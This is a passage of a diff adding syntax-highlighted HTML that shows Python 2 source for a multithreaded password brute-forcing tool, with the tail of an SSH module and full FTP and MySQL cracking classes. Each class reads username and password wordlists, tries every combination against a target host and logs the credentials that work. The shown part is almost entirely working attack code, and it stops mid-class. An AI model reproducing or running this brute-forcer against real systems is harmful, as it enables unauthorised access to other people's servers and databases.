+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################FTP爆破模块#################&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FtpBruter&lt;/span>(CommonFun):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for FtpBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(FtpBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FTP()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>connect(self&lt;span style="color:#f92672">.&lt;/span>host, &lt;span style="color:#ae81ff">21&lt;/span>, self&lt;span style="color:#f92672">.&lt;/span>timeout)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>login(name, pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>quit()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################MySQL爆破模块#################&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MysqlBruter&lt;/span>(CommonFun):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for MysqlBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(MysqlBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn &lt;span style="color:#f92672">=&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>connect(host&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host, user&lt;span style="color:#f92672">=&lt;/span>name, passwd&lt;span style="color:#f92672">=&lt;/span>pwd, db&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>, port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3306&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> conn:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># time.sleep(0.05)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
